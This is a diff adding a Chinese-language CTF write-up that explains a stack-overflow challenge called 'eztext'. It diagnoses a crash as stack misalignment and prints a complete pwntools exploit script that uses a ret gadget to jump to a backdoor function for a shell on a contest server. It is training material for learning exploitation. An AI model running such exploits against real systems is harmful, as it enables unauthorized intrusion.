@@ -165,5 +165,57 @@ r.recvline()
 r.sendline(shellcode)
 r.interactive()
 ```
-
-
+## eztext
+心血来潮找了集训队官网的一道pwn做了一下，比之前练的题还是要稍微进阶一点的，并且意外的是这题居然和之前练的题有巧妙的联系。
+![ez](images/eztext.webp)
+![ez1](images/eztext1.webp)
+![ez2](images/eztext2.webp)
+通过ida我们可以知道，在`main`函数里直接执行了`vuln`函数，而`vuln`函数有很明显的栈溢出，`buf`大小只有 72 字节，但是`read(0, buf, 0x200)`最多可读0x200=512字节,所以可以通过输入超长数据覆盖栈上的返回地址到图三的backdoor函数，即可获得`shell`。并且从ida里还可以得到偏移为0x58、backdoor = 0x401166。于是我们便可以按照上面`ROP`那道题写exp了，结果发现：
+```
+[DEBUG] Received 0x24 bytes:
+    b'bye\n'
+    b"[*] Welcome to Kong's backdoor!\n"
+bye
+[*] Welcome to Kong's backdoor!
+[*] Got EOF while reading in interactive
+```
+EOF(End Of File)了,EOF一般有以下几种原因：最常见的几种原因
+1. 程序崩溃了，比如：
+* 栈对齐没做好
+* ROP 链错了
+* 返回地址跳错了
+2. 程序正常执行完然后退出，例如目标程序只是：
+* 打印一点内容
+* 执行结束
+* 没有真的留下一个交互 shell
+那连接也会结束。
+3. shell 启动后立刻退出，有些情况下虽然调用了 /bin/sh，但：
+* 标准输入输出不对
+* 环境不完整
+* shell 被限制
+* 父进程退出带走了它
+4. 服务端主动断开，比如：
+* 超时
+* 检测到非法输入
+* 只允许一次请求
+* 守护进程限制连接时长
+想到了之前做的一道题--xmm寄存器只有在rsp的末尾为0时才能正常执行，猜想大概率是栈对齐没做好的原因，我们就进入GDB里调试一下
+![ez3](images/eztext3.webp)
+果然，知道为什么程序出错就好办了，使用ROPgadget来找下ret的地址：
+![ez4](images/eztext4.webp)
+现在再加上ret的地址试试
+```python
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug')
+r = remote('ctf.a1natas.com', 21986)
+playload = b'A' * 0x58+p64(0x40101a)+p64(0x401166)
+#gdb.attach(r)
+r.recvline()
+r.sendline(playload)
+r.interactive()
+```
+果然可以了！但是怎么没有flag呢？`cat flag`找不到啊。
+![ez5](images/eztext5.webp)
+这种情况我们可以用`ls -la /bin`这种形式的命令来查看目录里的具体内容
+![ez6](images/eztext6.webp)
+最后我们再/bin/flag处发现flag，用cat bin/flag\n命令得到flag。
